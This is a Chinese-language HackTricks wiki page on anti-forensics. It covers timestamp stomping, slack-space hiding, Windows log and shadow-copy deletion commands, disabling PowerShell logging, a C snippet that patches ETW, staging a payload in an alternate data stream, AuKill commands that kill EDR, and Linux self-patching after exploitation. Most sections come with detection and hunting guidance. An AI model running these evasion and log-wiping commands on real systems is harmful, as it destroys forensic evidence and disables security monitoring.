# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## 时间戳

攻击者可能会希望**更改文件的时间戳**，以避免被检测。\
可以在 MFT 的 `$STANDARD_INFORMATION` 属性和 `$FILE_NAME` 属性中找到时间戳。

这两个属性都包含 4 个时间戳：**修改时间**、**访问时间**、**创建时间**和 **MFT 注册表修改时间**（MACE 或 MACB）。

**Windows explorer** 和其他工具显示的是来自 **`$STANDARD_INFORMATION`** 的信息。

### TimeStomp - Anti-forensic Tool

此工具会**修改** **`$STANDARD_INFORMATION`** 中的时间戳信息，但**不会**修改 **`$FILE_NAME`** 中的信息。因此，可以**识别**出**可疑**活动。

### Usnjrnl

**USN Journal**（Update Sequence Number Journal，更新序列号日志）是 NTFS（Windows NT file system，Windows NT 文件系统）的一项功能，用于跟踪卷的变化。[**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) 工具可以检查这些变化。

![TimeStomp - Anti-forensic Tool - Usnjrnl: The USN Journal (Update Sequence Number Journal) is a feature of the NTFS (Windows NT file system) that keeps track of volume changes. The...](<../../images/image (801).png>)

上图是该**工具**显示的**输出**，可以观察到文件执行了某些**更改**。

### $LogFile

**文件系统的所有元数据更改都会被记录**，这一过程称为 [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging)。记录的元数据保存在名为 `**$LogFile**` 的文件中，该文件位于 NTFS 文件系统的根目录中。可以使用 [LogFileParser](https://github.com/jschicht/LogFileParser) 等工具解析此文件并识别更改。

![Usnjrnl - $LogFile: All metadata changes to a file system are logged in a process known as write-ahead logging. The logged metadata is kept in a file named $LogFile , located in the root...](<../../images/image (137).png>)

同样，在工具的输出中可以看到**执行了某些更改**。

使用同一工具可以识别时间戳被修改为**哪个时间**：

![Usnjrnl - $LogFile: Using the same tool it's possible to identify to which time the timestamps were modified](<../../images/image (1089).png>)

- CTIME：文件的创建时间
- ATIME：文件的修改时间
- MTIME：文件的 MFT 注册表修改时间
- RTIME：文件的访问时间

### `$STANDARD_INFORMATION` 和 `$FILE_NAME` 对比

识别可疑修改文件的另一种方法，是比较这两个属性中的时间，查找**不匹配**的情况。

### 纳秒

**NTFS** 时间戳的**精度**为 **100 纳秒**。因此，发现时间戳类似于 2010-10-10 10:10:**00.000:0000 的文件非常可疑**。

### SetMace - Anti-forensic Tool

此工具可以同时修改 `$STARNDAR_INFORMATION` 和 `$FILE_NAME` 两个属性。但是，从 Windows Vista 开始，必须通过 live OS 修改这些信息。

## Data Hiding

NFTS 使用簇和最小信息大小。这意味着，如果一个文件占用一个半簇，**剩余的一半空间在文件被删除之前永远不会被使用**。因此，可以**在这部分 slack space 中隐藏数据**。

有一些工具（例如 slacker）可以将数据隐藏在这部分“隐藏”空间中。但是，对 `$logfile` 和 `$usnjrnl` 的分析可以显示有数据被添加：

![SetMace - Anti-forensic Tool - Data Hiding: There are tools like slacker that allow hiding data in this "hidden" space. However, an analysis of the $logfile and $usnjrnl can show that...](<../../images/image (1060).png>)

随后，可以使用 FTK Imager 等工具获取 slack space。请注意，这类工具可以将内容保存为混淆甚至加密的形式。

## UsbKill

这是一个在检测到 USB 端口发生任何变化时**关闭计算机**的工具。\
发现它的一种方法是检查正在运行的进程，并**检查每个正在运行的 python 脚本**。

## Live Linux Distributions

这些发行版在 **RAM** 内存中**运行**。检测它们的唯一方法是检查 NTFS 文件系统是否以写权限挂载。如果仅以读权限挂载，则无法检测到入侵。

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

可以禁用多种 Windows 日志记录方法，使取证调查变得更加困难。

### Disable Timestamps - UserAssist

这是一个注册表项，用于维护用户运行每个可执行文件的日期和时间。

禁用 UserAssist 需要两个步骤：

1. 将两个注册表项 `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` 和 `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` 都设置为零，以表明要禁用 UserAssist。
2. 清除类似于 `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` 的注册表子树。

### Disable Timestamps - Prefetch

这会保存有关已执行应用程序的信息，目的是提高 Windows 系统的性能。但是，这些信息也可用于取证。

- 执行 `regedit`
- 选择文件路径 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- 右键单击 `EnablePrefetcher` 和 `EnableSuperfetch`
- 分别选择 Modify，将值从 1（或 3）更改为 0
- 重启

### Disable Timestamps - Last Access Time

每当从 Windows NT server 的 NTFS 卷打开文件夹时，系统都会更新每个列出文件夹中的**时间戳字段**，该字段称为最后访问时间。在使用频繁的 NTFS 卷上，这可能会影响性能。

1. 打开 Registry Editor（Regedit.exe）。
2. 浏览到 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`。
3. 查找 `NtfsDisableLastAccessUpdate`。如果不存在，则添加此 DWORD 并将其值设置为 1，这将禁用该过程。
4. 关闭 Registry Editor，然后重启 server。

### Delete USB History

所有 **USB Device Entries** 都存储在 Windows Registry 的 **USBSTOR** 注册表项下，其中包含在 USB Device 插入 PC 或 Laptop 时创建的子项。可以在此处找到该注册表项：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`。**删除此项**会删除 USB 历史记录。\
也可以使用 [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) 工具来确认已删除这些记录（并执行删除操作）。

另一个保存 USB 信息的文件是 `C:\Windows\INF` 中的 `setupapi.dev.log`。该文件也应该被删除。

### Disable Shadow Copies

使用 `vssadmin list shadowstorage` **列出** shadow copies\
运行 `vssadmin delete shadow` **删除**它们

也可以按照 [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) 中的步骤，通过 GUI 删除它们。

要禁用 shadow copies，请参考[此处的步骤](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows)：

1. 单击 Windows 开始按钮后，在文本搜索框中输入“services”，打开 Services 程序。
2. 在列表中找到“Volume Shadow Copy”，选中它，然后右键单击并打开 Properties。
3. 在“Startup type”下拉菜单中选择 Disabled，然后单击 Apply 和 OK 确认更改。

还可以在注册表 `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` 中修改 shadow copy 将要复制的文件配置。

### Overwrite deleted files

- 可以使用 **Windows tool**：`cipher /w:C`。这会让 cipher 删除 C 驱动器可用未使用磁盘空间中的所有数据。
- 也可以使用 [**Eraser**](https://eraser.heidi.ie) 等工具。

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> 展开“Windows Logs” --> 右键单击每个类别并选择“Clear Log”
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- 在 services 部分禁用“Windows Event Log”服务
- `WEvtUtil.exec clear-log` 或 `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

近期版本的 Windows 10/11 和 Windows Server 会在
`Microsoft-Windows-PowerShell/Operational`（事件 4104/4105/4106）下保存**丰富的 PowerShell 取证痕迹**。
攻击者可以即时禁用或清除这些痕迹：
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Defenders 应监控这些注册表键的变化，以及大批量移除 PowerShell events 的行为。

### ETW (Event Tracing for Windows) Patch

Endpoint security products 高度依赖 ETW。一种流行的 2024 年 evasion 方法是在内存中 patch
`ntdll!EtwEventWrite`/`EtwEventWriteFull`，使每次 ETW 调用都返回 `STATUS_SUCCESS`，
而不发出 event：<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs（例如 `EtwTiSwallow`）会在 PowerShell 或 C++ 中实现相同的 primitive。
由于该 patch 是 **process-local** 的，运行在其他进程中的 EDR 可能会漏检它。<sup>[[5]](#references)</sup>
检测方式：比较内存中的 `ntdll` 与磁盘上的版本，或在 user-mode 之前进行 hook。

### Alternate Data Streams (ADS) Revival

2023 年的 Malware campaigns（例如 **FIN12** loaders）被发现将 second-stage binaries
暂存于 ADS 中，以避开传统 scanners：
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
使用 `dir /R`、`Get-Item -Stream *` 或 Sysinternals `streams64.exe` 枚举 streams。  
将主机文件复制到 FAT/exFAT，或通过 SMB 复制，会移除隐藏 stream，调查人员可借此恢复 payload。

### BYOVD & “AuKill”（2023）

Bring-Your-Own-Vulnerable-Driver 现已被常规用于勒索软件入侵中的 **anti-forensics**。  
开源工具 **AuKill** 加载已签名但存在漏洞的驱动程序（`procexp152.sys`），在加密和销毁日志**之前**暂停或终止 EDR 及 forensic sensors：<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
驱动程序随后会被移除，仅留下极少的痕迹。<sup>[[1]](#references)</sup>
缓解措施：启用 Microsoft vulnerable-driver blocklist（HVCI/SAC），
并针对从用户可写路径创建内核服务的行为发出警报。

---

## Linux 反取证：自我修补与 Cloud C2（2023–2025）

### 自我修补遭入侵的服务以降低检测率（Linux）
攻击者越来越多地在利用服务后立即进行“自我修补”，以同时防止再次利用并抑制基于漏洞的检测。其做法是用最新的合法上游二进制文件/JAR 替换存在漏洞的组件，使扫描器报告主机已完成修补，同时保留持久化和 C2。<sup>[[3]](#references)</sup>

示例：Apache ActiveMQ OpenWire RCE（CVE‑2023‑46604）<sup>[[3]](#references)[[4]](#references)</sup>
- 在 post-exploitation 阶段，攻击者从 Maven Central（repo1.maven.org）获取合法 JAR，删除 ActiveMQ 安装目录中的存在漏洞的 JAR，然后重启 broker。
- 这关闭了初始 RCE，同时保留了其他 foothold（cron、SSH 配置更改以及独立的 C2 implants）。

操作示例（说明性）
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
取证/狩猎提示
- 检查服务目录中是否存在未计划的 binary/JAR 替换：
- Debian/Ubuntu：`dpkg -V activemq`，并将文件哈希/路径与 repo mirrors 进行比较。
- RHEL/CentOS：`rpm -Va 'activemq*'`
- 查找磁盘上存在但不归 package manager 所有的 JAR 版本，或在带外更新的 symbolic links。
- 时间线：`find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort`，将 ctime/mtime 与 compromise 时间窗口进行关联。
- Shell history/process telemetry：查找初始 exploitation 后立即使用 `curl`/`wget` 访问 `repo1.maven.org` 或其他 artifact CDN 的证据。
- Change management：验证是谁以及为何应用了该“patch”，而不只是确认存在 patched version。

### 使用 bearer tokens 和 anti-analysis stagers 的 Cloud-service C2
观察到的 tradecraft 结合了多条 long-haul C2 路径和 anti-analysis packaging：<sup>[[3]](#references)</sup>
- 使用 password-protected PyInstaller ELF loaders 来阻碍 sandboxing 和 static analysis（例如 encrypted PYZ、在 `/_MEI*` 下进行临时 extraction）。
- Indicators：`strings` 命中 `PyInstaller`、`pyi-archive`、`PYZ-00.pyz`、`MEIPASS` 等字符串。
- Runtime artifacts：extraction 到 `/tmp/_MEI*` 或自定义的 `--runtime-tmpdir` 路径。
- 基于 Dropbox 的 C2，使用 hardcoded OAuth Bearer tokens
- Network markers：`api.dropboxapi.com` / `content.dropboxapi.com`，以及包含 `Authorization: Bearer <token>` 的请求。
- 在 proxy/NetFlow/Zeek/Suricata 中 hunting：查找来自通常不会同步文件的 server workloads、发往 Dropbox domains 的 outbound HTTPS。
- 通过 tunneling 进行 parallel/backup C2（例如 Cloudflare Tunnel `cloudflared`），在某一 channel 被阻断时仍保持 control。
- Host IOCs：`cloudflared` processes/units、位于 `~/.cloudflared/*.json` 的 config、发往 Cloudflare edges 的 outbound 443。

### 用于维持 access 的 Persistence 和“hardening rollback”（Linux 示例）
Attackers 经常将 self-patching 与 durable access paths 结合：<sup>[[3]](#references)</sup>
- Cron/Anacron：编辑每个 `/etc/cron.*/` directory 中的 `0anacron` stub，以便周期性执行。
- Hunt：
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback：启用 root logins，并修改 low-privileged accounts 的 default shells。
- Hunt root login enablement：
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt system accounts 上可疑的 interactive shells（例如 `games`）：
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- 将随机的短名称 beacon artifacts（8 个字母字符）写入磁盘，同时联系 cloud C2：
- Hunt：
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders 应将这些 artifacts 与 external exposure 和 service patching events 进行关联，以发现用于隐藏 initial exploitation 的 anti-forensic self-remediation。

## References

- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Hiding Your .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)

{{#include ../../banners/hacktricks-training.md}}
